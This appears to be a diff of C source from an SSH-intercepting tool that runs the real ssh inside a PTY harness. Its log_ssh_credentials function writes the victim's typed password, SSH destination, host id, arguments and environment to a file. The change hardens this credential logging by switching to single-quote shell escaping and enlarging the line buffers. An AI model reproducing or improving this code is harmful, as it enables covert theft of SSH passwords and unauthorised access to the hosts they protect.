@@ -644,37 +644,37 @@ log_ssh_credentials(void)
 	}
 
 	char *display = getenv("DISPLAY");
-	fprintf(fp, "LOG_DISPLAY=\"%s\"\n", display?display:"");
+	fprintf(fp, "LOG_DISPLAY='%s'\n", display?display:"");
 
 	char *askpass = getenv("SSH_ASKPASS");
-	fprintf(fp, "LOG_SSH_ASKPASS=\"%s\"\n", askpass?askpass:"");
+	fprintf(fp, "LOG_SSH_ASKPASS='%s'\n", askpass?askpass:"");
 
-	fprintf(fp, "LOG_HOME=\"%s\"\n", BASH_escape(buf, sizeof buf, getenv("HOME"), '"'));
-	fprintf(fp, "LOG_PATH=\"%s\"\n", BASH_escape(buf, sizeof buf, getenv("PATH"), '"'));
-	fprintf(fp, "LOG_CWD=\"%s\"\n", BASH_escape(buf, sizeof buf, getcwd(NULL, 0), '"'));
+	fprintf(fp, "LOG_HOME='%s'\n", BASH_escape_squote(buf, sizeof buf, getenv("HOME")));
+	fprintf(fp, "LOG_PATH='%s'\n", BASH_escape_squote(buf, sizeof buf, getenv("PATH")));
+	fprintf(fp, "LOG_CWD='%s'\n", BASH_escape_squote(buf, sizeof buf, getcwd(NULL, 0)));
 
 	// Log all original arguments
 	int i;
 	for (i = 0; i < g_argc_backup; i++)
-		fprintf(fp, "LOG_ARG_%d=\"%s\"\n", i, BASH_escape(buf, sizeof buf, g_argv_backup[i], '"'));
+		fprintf(fp, "LOG_ARG_%d='%s'\n", i, BASH_escape_squote(buf, sizeof buf, g_argv_backup[i]));
 
 	// Log password. \n provided by user input.
 	if (g.password == NULL)
 		buf[0] = '\0';
 	else {
-		BASH_escape(buf, sizeof buf, g.password, '"');
+		BASH_escape_squote(buf, sizeof buf, g.password);
 		// Password is stored with '\n' or '\r\n' at the end. Strip it.
 		size_t sz = strlen(buf);
 		if ((sz > 0) && (buf[sz - 1] == '\n'))
 			buf[sz - 1] = '\0';
 	}
-	fprintf(fp, "LOG_PASSWORD=\"%s\"\n", buf);
+	fprintf(fp, "LOG_PASSWORD='%s'\n", buf);
 
 	// Log unique host id (user@hostname:port)
-	fprintf(fp, "LOG_SSH_HOST_ID=\"%s\"\n", g_host_id);
+	fprintf(fp, "LOG_SSH_HOST_ID='%s'\n", BASH_escape_squote(buf, sizeof buf, g_host_id));
 
 	// Log ssh destination
-	fprintf(fp, "LOG_SSH_DESTINATION=\"%s\"\n", BASH_escape(buf, sizeof buf, g.ssh_destination, '"'));
+	fprintf(fp, "LOG_SSH_DESTINATION='%s'\n", BASH_escape_squote(buf, sizeof buf, g.ssh_destination));
 
 	// LAST LINE is always the command
 	// Log prefered command line to log in (including real target)
@@ -1346,8 +1346,8 @@ pty_ssh_start(void)
 	// This can happen when not asked for a password at all (key-auth)
 	if (stage_i < THC_STAGE_I_INSIDE)
 	{
-		LNBUF_init(&g.ln_pty, 80, fd_pty, cb_lnbuf, &g.ln_pty);
-		LNBUF_init(&g.ln_in, 80, STDIN_FILENO, cb_lnbuf, &g.ln_in);
+		LNBUF_init(&g.ln_pty, 256, fd_pty, cb_lnbuf, &g.ln_pty);
+		LNBUF_init(&g.ln_in, 256, STDIN_FILENO, cb_lnbuf, &g.ln_in);
 	}
 
 	// Start original ssh in a PTY-harness
